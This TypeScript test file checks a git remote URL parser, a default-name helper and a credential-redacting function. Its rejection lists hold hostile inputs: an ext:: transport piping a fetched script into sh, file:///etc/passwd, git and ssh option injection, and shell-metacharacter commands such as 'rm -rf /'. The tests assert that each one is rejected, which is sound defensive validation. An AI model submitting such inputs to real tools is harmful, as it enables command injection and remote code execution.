import { describe, it, expect } from "vitest";
import { parseGitRemote, defaultNameFromRemote, redactGitUrl } from "./git-remote-url";

describe("parseGitRemote", () => {
  it("accepts a plain GitHub https URL", () => {
    expect(parseGitRemote("https://github.com/octocat/Hello-World")).toEqual({
      url: "https://github.com/octocat/Hello-World",
      owner: "octocat",
      repo: "Hello-World",
    });
  });

  it("keeps a .git suffix on the wire but strips it from the repo name", () => {
    expect(parseGitRemote("https://github.com/octocat/Hello-World.git")).toEqual({
      url: "https://github.com/octocat/Hello-World.git",
      owner: "octocat",
      repo: "Hello-World",
    });
  });

  it("expands bare owner/repo shorthand to a GitHub URL", () => {
    expect(parseGitRemote("octocat/Hello-World")).toEqual({
      url: "https://github.com/octocat/Hello-World",
      owner: "octocat",
      repo: "Hello-World",
    });
  });

  it("accepts scp-style git@host:owner/repo.git", () => {
    expect(parseGitRemote("git@github.com:octocat/Hello-World.git")).toEqual({
      url: "git@github.com:octocat/Hello-World.git",
      owner: "octocat",
      repo: "Hello-World",
    });
  });

  it("accepts a non-GitHub https host, including nested groups", () => {
    expect(parseGitRemote("https://gitlab.com/group/sub/repo")).toEqual({
      url: "https://gitlab.com/group/sub/repo",
      owner: "group/sub",
      repo: "repo",
    });
  });

  it("accepts ssh:// URLs", () => {
    const r = parseGitRemote("ssh://git@github.com/octocat/Hello-World.git");
    expect(r?.url).toBe("ssh://git@github.com/octocat/Hello-World.git");
    expect(r?.repo).toBe("Hello-World");
  });

  it("trims surrounding whitespace", () => {
    expect(parseGitRemote("  https://github.com/octocat/Hello-World \n")?.url).toBe(
      "https://github.com/octocat/Hello-World",
    );
  });

  const rejected: Array<[string, string]> = [
    ["empty", ""],
    ["whitespace only", "   "],
    // `ext::` runs an arbitrary command as a git transport — never accept it.
    ["ext:: transport", "ext::sh -c 'curl evil.sh | sh'"],
    ["file:// transport", "file:///etc/passwd"],
    ["leading dash (option injection)", "--upload-pack=touch /tmp/pwn"],
    ["semicolon", "https://github.com/a/b;whoami"],
    ["backtick", "https://github.com/a/`whoami`"],
    ["dollar", "https://github.com/a/$(whoami)"],
    ["single quote", "https://github.com/a/b'c"],
    ["pipe", "https://github.com/a/b|c"],
    ["newline", "https://github.com/a/b\nrm -rf /"],
    ["NUL", "https://github.com/a/b\u0000c"],
    ["unsupported scheme", "http://github.com/a/b"],
    ["not a URL at all", "just some words"],
    ["shorthand with too many segments", "a/b/c"],
    ["shorthand missing repo", "octocat/"],
  ];

  for (const [label, input] of rejected) {
    it(`rejects ${label}`, () => {
      expect(parseGitRemote(input)).toBeNull();
    });
  }
});

describe("defaultNameFromRemote", () => {
  it("uses the repo name", () => {
    const r = parseGitRemote("https://github.com/octocat/Hello-World.git")!;
    expect(defaultNameFromRemote(r)).toBe("Hello-World");
  });

  it("survives a trailing slash", () => {
    const r = parseGitRemote("https://github.com/octocat/Hello-World/")!;
    expect(defaultNameFromRemote(r)).toBe("Hello-World");
  });
});

// Parity with `main/ipc-validation.ts`. A URL the dialog accepts and main then
// rejects is a bad-UX bug (the user only finds out after the flow committed to
// a name); a URL the dialog accepts that is *dangerous* is worse. Both sides
// must reject the same shapes.
describe("parseGitRemote — parity with the main-process validator", () => {
  const rejected = [
    "ssh://-oProxyCommand=touch/repo",
    "ssh://-Fevil.conf/owner/repo",
    "git@-oProxyCommand=touch:a/b",
    "git@-Fevil.conf:a/b",
    "ssh://git@github.com/-repo",
    "git@github.com:-repo/x",
    "https://-evil.example.com/a/b",
    // main caps the URL at 2048 characters.
    `https://github.com/a/${"b".repeat(3000)}`,
  ];
  for (const bad of rejected) {
    it(`rejects ${bad.slice(0, 48)}`, () => {
      expect(parseGitRemote(bad)).toBeNull();
    });
  }

  it("still accepts an ordinary hyphenated repo", () => {
    expect(parseGitRemote("https://github.com/octo-cat/Hello-World")?.repo).toBe("Hello-World");
    expect(parseGitRemote("git@github.com:octo-cat/Hello-World.git")?.repo).toBe("Hello-World");
  });
});

// A credentialed remote is still cloneable, but the secret must never be
// painted into the progress overlay or a log line.
describe("redactGitUrl", () => {
  it("masks a user:password pair", () => {
    expect(redactGitUrl("https://alice:s3cret@github.com/o/r.git")).toBe(
      "https://***@github.com/o/r.git",
    );
  });

  it("masks a token carried in the username alone", () => {
    expect(redactGitUrl("https://ghp_abc123@github.com/o/r")).toBe("https://***@github.com/o/r");
  });

  it("leaves a credential-free URL untouched", () => {
    expect(redactGitUrl("https://github.com/o/r.git")).toBe("https://github.com/o/r.git");
  });

  it("leaves scp-style git@host alone — that is a login name, not a secret", () => {
    expect(redactGitUrl("git@github.com:o/r.git")).toBe("git@github.com:o/r.git");
  });

  it("returns unparseable input unchanged (display helper, not a validator)", () => {
    expect(redactGitUrl("not a url")).toBe("not a url");
  });

  it("never leaks the secret substring", () => {
    expect(redactGitUrl("https://alice:s3cret@github.com/o/r")).not.toContain("s3cret");
  });
});
